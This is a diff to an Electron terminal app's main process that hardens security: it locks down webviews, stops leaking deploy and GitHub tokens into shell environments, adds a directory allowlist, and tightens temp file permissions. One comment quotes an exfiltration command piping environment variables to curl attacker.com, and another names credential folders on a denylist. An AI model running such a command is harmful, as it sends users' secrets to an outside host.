@@ -1,17 +1,19 @@
-import { app, BrowserWindow, dialog, Menu, shell, ipcMain, clipboard } from 'electron';
+import { app, BrowserWindow, dialog, ipcMain, clipboard } from 'electron';
 import path from 'path';
 import fs from 'fs';
 import os from 'os';
 import { autoUpdater } from 'electron-updater';
 
 import { registerPtyHandlers, killAllPtys, hasActivePtys } from './pty';
-import { registerFsHandlers } from './filesystem';
+import { registerFsHandlers, addAllowedRoot } from './filesystem';
 import { registerWatcherHandlers, closeWatcher } from './watcher';
 import { registerSettingsHandlers } from './settings';
 import { registerGitHandlers } from './git';
-import { registerDeployHandlers, processProtocolUrl, getToken, getGithubToken, getAskpassHelperPath, writeAskpassHelper, API_BASE } from './deploy';
+import { registerDeployHandlers, processProtocolUrl, getGithubToken, writeAskpassHelper, API_BASE } from './deploy';
 import { registerPreviewHandlers } from './preview';
 import { registerUpdateCheckerHandlers, startPeriodicCheck, stopPeriodicCheck } from './update-checker';
+import { buildMenu } from './menu';
+import { ensureCozypaneMcpConfig } from './mcp-config';
 
 // Global error handlers
 process.on('uncaughtException', (err) => {
@@ -23,6 +25,34 @@ process.on('uncaughtException', (err) => {
 });
 process.on('unhandledRejection', (reason) => {
   console.error('[CozyPane] Unhandled rejection:', reason);
+});
+
+// Harden any <webview> attachments. Electron allows renderer code to set
+// webPreferences attributes on <webview> elements, which can re-enable
+// nodeIntegration or inject a custom preload script — both would escape
+// the sandbox. Strip those fields at attach time so the renderer cannot
+// grant itself elevated privileges through an attached webview.
+app.on('web-contents-created', (_event, contents) => {
+  contents.on('will-attach-webview', (_evt, webPreferences, _params) => {
+    // eslint-disable-next-line @typescript-eslint/no-explicit-any
+    const prefs = webPreferences as any;
+    delete prefs.preload;
+    delete prefs.preloadURL;
+    prefs.nodeIntegration = false;
+    prefs.nodeIntegrationInSubFrames = false;
+    prefs.contextIsolation = true;
+    prefs.sandbox = true;
+    prefs.webSecurity = true;
+  });
+  // Also refuse navigations to non-http(s) protocols from the main window.
+  contents.on('will-navigate', (evt, url) => {
+    try {
+      const parsed = new URL(url);
+      if (parsed.protocol !== 'http:' && parsed.protocol !== 'https:' && parsed.protocol !== 'file:' && parsed.protocol !== 'devtools:') {
+        evt.preventDefault();
+      }
+    } catch { /* ignore — malformed URLs block */ evt.preventDefault(); }
+  });
 });
 
 let mainWindow: BrowserWindow | null = null;
@@ -117,158 +147,35 @@ function createWindow() {
   });
 }
 
-function buildMenu() {
-  const isMac = process.platform === 'darwin';
-
-  const template: Electron.MenuItemConstructorOptions[] = [
-    ...(isMac ? [{
-      label: app.name,
-      submenu: [
-        { role: 'about' as const },
-        { type: 'separator' as const },
-        {
-          label: 'Settings...',
-          accelerator: 'Cmd+,' as const,
-          click: () => mainWindow?.webContents.send('menu:settings'),
-        },
-        { type: 'separator' as const },
-        { role: 'services' as const },
-        { type: 'separator' as const },
-        { role: 'hide' as const },
-        { role: 'hideOthers' as const },
-        { role: 'unhide' as const },
-        { type: 'separator' as const },
-        { role: 'quit' as const },
-      ],
-    }] : []),
-    {
-      label: 'Edit',
-      submenu: [
-        { role: 'undo' },
-        { role: 'redo' },
-        { type: 'separator' },
-        { role: 'cut' },
-        { role: 'copy' },
-        { role: 'paste' },
-        { role: 'selectAll' },
-        ...(isMac ? [
-          { type: 'separator' as const },
-          {
-            label: 'Speech',
-            submenu: [
-              { role: 'startSpeaking' as const },
-              { role: 'stopSpeaking' as const },
-            ],
-          },
-        ] : []),
-      ],
-    },
-    {
-      label: 'Terminal',
-      submenu: [
-        {
-          label: 'New Tab',
-          accelerator: 'CmdOrCtrl+T',
-          click: () => mainWindow?.webContents.send('menu:new-tab'),
-        },
-        {
-          label: 'Close Tab',
-          accelerator: 'CmdOrCtrl+W',
-          click: () => mainWindow?.webContents.send('menu:close-tab'),
-        },
-        { type: 'separator' },
-        {
-          label: 'Split View',
-          click: () => mainWindow?.webContents.send('menu:split-view'),
-        },
-        {
-          label: 'Clear Terminal',
-          accelerator: 'CmdOrCtrl+K',
-          click: () => mainWindow?.webContents.send('menu:clear-terminal'),
-        },
-      ],
-    },
-    {
-      label: 'View',
-      submenu: [
-        {
-          label: 'Toggle Panels',
-          accelerator: 'CmdOrCtrl+B',
-          click: () => mainWindow?.webContents.send('menu:toggle-panels'),
-        },
-        {
-          label: 'Switch Layout',
-          click: () => mainWindow?.webContents.send('menu:toggle-layout'),
-        },
-        { type: 'separator' },
-        {
-          label: 'Zoom In (Focused Panel)',
-          accelerator: 'CmdOrCtrl+=',
-          click: () => mainWindow?.webContents.send('menu:zoom-in'),
-        },
-        {
-          label: 'Zoom Out (Focused Panel)',
-          accelerator: 'CmdOrCtrl+-',
-          click: () => mainWindow?.webContents.send('menu:zoom-out'),
-        },
-        {
-          label: 'Reset Zoom (Focused Panel)',
-          accelerator: 'CmdOrCtrl+0',
-          click: () => mainWindow?.webContents.send('menu:zoom-reset'),
-        },
-        { type: 'separator' },
-        { role: 'togglefullscreen' },
-        { type: 'separator' as const },
-        { role: 'toggleDevTools' as const },
-      ],
-    },
-    {
-      label: 'Window',
-      submenu: [
-        { role: 'minimize' },
-        { role: 'zoom' },
-        ...(isMac ? [
-          { type: 'separator' as const },
-          { role: 'front' as const },
-        ] : [
-          { role: 'close' as const },
-        ]),
-      ],
-    },
-    {
-      label: 'Help',
-      submenu: [
-        {
-          label: 'CozyPane Website',
-          click: () => shell.openExternal('https://cozypane.com'),
-        },
-        {
-          label: 'Report Issue',
-          click: () => shell.openExternal('https://github.com/speudoname/cozypane/issues'),
-        },
-      ],
-    },
-  ];
-
-  Menu.setApplicationMenu(Menu.buildFromTemplate(template));
-}
-
-// Register IPC handlers from modules
+// Register IPC handlers from modules.
+//
+// H3: PTYs no longer inherit COZYPANE_DEPLOY_TOKEN or COZYPANE_GH_TOKEN.
+// Previously `env | curl attacker.com` from any shell leaked both tokens.
+// The MCP server subprocess now reads the deploy token from the MCP
+// config file's `env` block (written mode 0600 by ensureCozypaneMcpConfig),
+// and the Git panel's push/pull commands inline the GH token via
+// `wrapCommand` in git.ts — so neither case needs the tokens in the
+// PTY environment.
+//
+// Non-secret env vars (API URL, user-data path) are still exported so
+// the MCP server can locate itself when spawned ad-hoc.
 registerPtyHandlers(getWindow, () => {
-  const token = getToken();
   const env: Record<string, string> = {
     COZYPANE_API_URL: API_BASE,
     COZYPANE_USER_DATA: app.getPath('userData'),
   };
-  if (token) env.COZYPANE_DEPLOY_TOKEN = token;
-  const ghToken = getGithubToken();
-  if (ghToken) {
-    env.COZYPANE_GH_TOKEN = ghToken;
-    env.GIT_ASKPASS = getAskpassHelperPath();
-  }
   return env;
 });
 registerFsHandlers();
+
+// H2/H7: Seed the allowlist with the home directory so TabLauncher, default
+// create-project flow, and generally non-project-specific operations work on
+// first launch. Individual terminal cwds and user-picked directories are
+// also added dynamically. The denylist inside filesystem.ts still blocks
+// `.ssh`, `.aws`, `.claude.json`, and other sensitive locations even
+// though home is allowlisted — which is the net tightening from H2.
+addAllowedRoot(os.homedir());
+
 registerWatcherHandlers(getWindow);
 registerSettingsHandlers();
 registerGitHandlers();
@@ -293,18 +200,11 @@ ipcMain.handle('fs:pickDirectory', async () => {
     properties: ['openDirectory'],
     title: 'Open Project',
   });
-  return { paths: result.canceled ? [] : result.filePaths };
-});
-
-// Create directory
-ipcMain.handle('fs:mkdir', async (_event, dirPath: string) => {
-  const fs = await import('fs');
-  try {
-    fs.mkdirSync(dirPath, { recursive: true });
-    return { success: true };
-  } catch (err: any) {
-    return { error: err.message };
-  }
+  const paths = result.canceled ? [] : result.filePaths;
+  // Any directory the user explicitly picks becomes an allowed root for
+  // subsequent filesystem / watcher operations (H2/H7).
+  for (const p of paths) addAllowedRoot(p);
+  return { paths };
 });
 
 // Save clipboard image to temp file
@@ -313,10 +213,12 @@ ipcMain.handle('fs:saveClipboardImage', async () => {
   if (img.isEmpty()) return { path: null };
   try {
     const tmpDir = path.join(os.tmpdir(), 'cozypane');
-    fs.mkdirSync(tmpDir, { recursive: true });
+    fs.mkdirSync(tmpDir, { recursive: true, mode: 0o700 });
     const fileName = `clipboard-${Date.now()}.png`;
     const filePath = path.join(tmpDir, fileName);
-    fs.writeFileSync(filePath, img.toPNG());
+    // Mode 0600 — clipboard screenshots often contain secrets, don't let
+    // other processes on the machine read them via the world-readable tmpdir.
+    fs.writeFileSync(filePath, img.toPNG(), { mode: 0o600 });
     return { path: filePath };
   } catch (err: any) {
     return { path: null, error: err.message };
@@ -389,7 +291,14 @@ function setupAutoUpdater() {
   });
 
   autoUpdater.on('error', (err) => {
+    // M28: forward the error to the renderer so UpdateBanner can show a
+    // diagnostic. Silent-only logging meant a broken auto-update channel
+    // (network error, signature mismatch, disk full) went completely
+    // unnoticed by users.
     console.error('[CozyPane] Auto-update error:', err.message);
+    if (mainWindow && !mainWindow.isDestroyed()) {
+      mainWindow.webContents.send('updates:error', { message: err.message || 'Update failed' });
+    }
   });
 
   autoUpdater.checkForUpdates().catch((err: any) => console.error('[CozyPane] checkForUpdates failed:', err.message));
@@ -397,69 +306,16 @@ function setupAutoUpdater() {
   setInterval(() => autoUpdater.checkForUpdates().catch((err: any) => console.error('[CozyPane] checkForUpdates failed:', err.message)), 4 * 60 * 60 * 1000);
 }
 
-// CozyPane MCP visibility is scoped to sessions that CozyPane itself spawns. We never
-// write .mcp.json into user project directories (to avoid machine-specific absolute
-// paths leaking into git). Instead we keep one static .mcp.json inside CozyPane's
-// userData dir, and when launching `claude` for a cozy-mode project, the renderer
-// adds `--mcp-config <path>` to the auto-command. External terminals that don't pass
-// that flag see no cozypane MCP at all — satisfying both scoping rules:
+// CozyPane MCP visibility is scoped to sessions that CozyPane itself spawns.
+// See `src/main/mcp-config.ts` for the extraction + config-file generation
+// helpers. We never write .mcp.json into user project directories (to avoid
+// machine-specific absolute paths leaking into git). Instead we keep one
+// static .mcp.json inside CozyPane's userData dir, and when launching
+// `claude` for a cozy-mode project, the renderer adds `--mcp-config <path>`
+// to the auto-command. External terminals that don't pass that flag see no
+// cozypane MCP at all — satisfying both scoping rules:
 //   1. terminal must be CozyPane's PTY (only that launcher adds the flag)
 //   2. project must be cozy mode (renderer only adds the flag when cozyMode === true)
-
-let extractedMcpServerPath: string | null = null;
-let cozypaneMcpConfigPath: string | null = null;
-
-function ensureMcpServerExtracted(): string {
-  if (extractedMcpServerPath) return extractedMcpServerPath;
-
-  if (isDev) {
-    extractedMcpServerPath = path.join(__dirname, 'mcp-server.js');
-    return extractedMcpServerPath;
-  }
-
-  // Node.js can't require files from inside an asar archive directly.
-  // Extract the MCP server to a real path on disk so Claude Code can run it.
-  const asarSource = path.join(process.resourcesPath!, 'app.asar', 'dist', 'main', 'mcp-server.js');
-  const extractDir = path.join(app.getPath('userData'), 'mcp');
-  const extractPath = path.join(extractDir, 'mcp-server.js');
-
-  if (!fs.existsSync(extractDir)) fs.mkdirSync(extractDir, { recursive: true });
-  // Always overwrite to keep in sync with app version
-  fs.copyFileSync(asarSource, extractPath);
-  extractedMcpServerPath = extractPath;
-  return extractedMcpServerPath;
-}
-
-function ensureCozypaneMcpConfig(): string {
-  if (cozypaneMcpConfigPath && fs.existsSync(cozypaneMcpConfigPath)) {
-    return cozypaneMcpConfigPath;
-  }
-
-  const mcpServerPath = ensureMcpServerExtracted();
-  const configDir = path.join(app.getPath('userData'), 'mcp');
-  const configPath = path.join(configDir, 'cozypane.mcp.json');
-
-  if (!fs.existsSync(configDir)) fs.mkdirSync(configDir, { recursive: true });
-
-  const config = {
-    mcpServers: {
-      cozypane: {
-        type: 'stdio',
-        command: 'node',
-        args: [mcpServerPath],
-      },
-    },
-  };
-
-  try {
-    fs.writeFileSync(configPath, JSON.stringify(config, null, 2));
-  } catch (err) {
-    console.error('[CozyPane] Failed to write cozypane MCP config:', err);
-  }
-
-  cozypaneMcpConfigPath = configPath;
-  return configPath;
-}
 
 // App lifecycle
 app.whenReady().then(() => {
@@ -488,7 +344,7 @@ app.whenReady().then(() => {
     app.setAsDefaultProtocolClient('cozypane');
   }
 
-  buildMenu();
+  buildMenu(getWindow);
   createWindow();
   setupAutoUpdater();
   startPeriodicCheck(getWindow);
@@ -539,5 +395,23 @@ app.on('before-quit', (e) => {
     killAllPtys();
     closeWatcher();
     stopPeriodicCheck();
+    cleanupClipboardTempFiles();
   }
 });
+
+// M9: wipe the per-user clipboard-image temp directory on quit. Individual
+// clipboard images were being written to `os.tmpdir()/cozypane/clipboard-*.png`
+// with no cleanup, accumulating forever (and tmpdir on macOS can be
+// world-readable, which is bad for screenshots containing secrets).
+function cleanupClipboardTempFiles(): void {
+  try {
+    const clipDir = path.join(os.tmpdir(), 'cozypane');
+    if (!fs.existsSync(clipDir)) return;
+    const files = fs.readdirSync(clipDir);
+    for (const name of files) {
+      if (name.startsWith('clipboard-') && name.endsWith('.png')) {
+        try { fs.unlinkSync(path.join(clipDir, name)); } catch { /* ignore */ }
+      }
+    }
+  } catch { /* non-fatal */ }
+}
